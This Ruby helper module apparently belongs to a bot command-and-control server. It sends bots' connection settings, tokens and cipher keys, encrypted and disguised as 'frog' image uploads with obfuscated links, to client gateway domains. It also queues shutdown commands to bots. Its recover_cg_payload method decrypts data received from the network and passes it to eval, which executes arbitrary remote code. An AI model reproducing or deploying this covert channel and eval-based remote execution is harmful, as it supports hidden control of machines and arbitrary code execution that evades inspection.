# frozen_string_literal: true

module ClientGatewayHelper
  include CryptHelper
  include OffuscateHelper

  def send_client_bots_settings(client_gateway_id)
    client_gateway = ClientGateway.find_by(id: client_gateway_id)

    raise CustomError.new(message: 'Bad Client Gateway', code: '1000') if client_gateway.blank?

    bots = []
    client_gateway.bots.each do |b|
      config = b.bot_settings.only_active.bot_client_config['settings']
      bots << {
        code: config['bot_id'],
        client_c_uri: config['client_c_uri'],
        client_c_pool: config['client_c_pool'],
        client_c_token: config['client_c_token'],
        client_c_cipher_key: config['client_c_cipher_key'],
        client_c_cipher_iv: config['client_c_cipher_iv']
      }
    end

    info = {
      action: 'LOAD_BOT_SETTINGS',
      bots: bots
    }

    RestClient::Request.execute(
      method: :post,
      url: "https://www.#{client_gateway.domain}/#{client_gateway.cc_setting['pool']}", # "#{client_gateway.domain}/#{client_gateway.cc_setting['pool']}",
      timeout: 10,
      headers: get_gateway_client_headers(client_gateway.cc_setting['token']),
      payload: get_gateway_client_payload(info, client_gateway)
    )

  rescue RestClient::ExceptionWithResponse => e
    CustomError.new(code: '5001', message: e.response)
  rescue StandardError => e
    CustomError.new(code: '5001', message: e)
  end

  def get_gateway_client_headers(token)
    {
      content_type: :json, accept: :json, delivery_descriptor: token
    }
  end

  def get_gateway_client_payload(plain_info, client_gateway)
    result = encrypt(plain_info.to_s, client_gateway.cc_setting['key'], client_gateway.cc_setting['iv'])
    image = result[:ciphertext]
    url = ofuscate_image_link(result[:tag], client_gateway.domain, client_gateway.cc_setting['pool'])

    {
      name: "frog #{rand(900000)}",
      image: image,
      url: url
    }
  end

  def recover_cg_payload(image, url, ref_offuscate, cipher_key, cipher_iv)
    tag = unofuscate_image_link(url, ref_offuscate)
    plain_info = decrypt(image, tag, cipher_key, cipher_iv)
    plain_info

    eval(plain_info)
  end

  def turn_off_client_bots(client_gateway)
    shut_command = BotCommandPool::COMMANDS_TYPE_CODES['CLIENT_SHUT_DEPLOYMENT']
    c = BotCommandPool.available_commands[shut_command.to_sym]
    client_gateway.bots.each do |b|
      setting = b.bot_settings.only_active
      next if setting.blank?

      setting.update(bot_client_config: {})
      b.bot_command_pools.create(
        command: shut_command,
        metadata: {
          command: shut_command,
          type: c[:type],
          type_2: c[:type_2],
          type_3: c[:type_3],
          action: nil
        }
      ) if !b.client_shutdown_on_going? || !b.shutdown_on_going?

      b.update(client_gateway_id: nil)
    end
  end
end
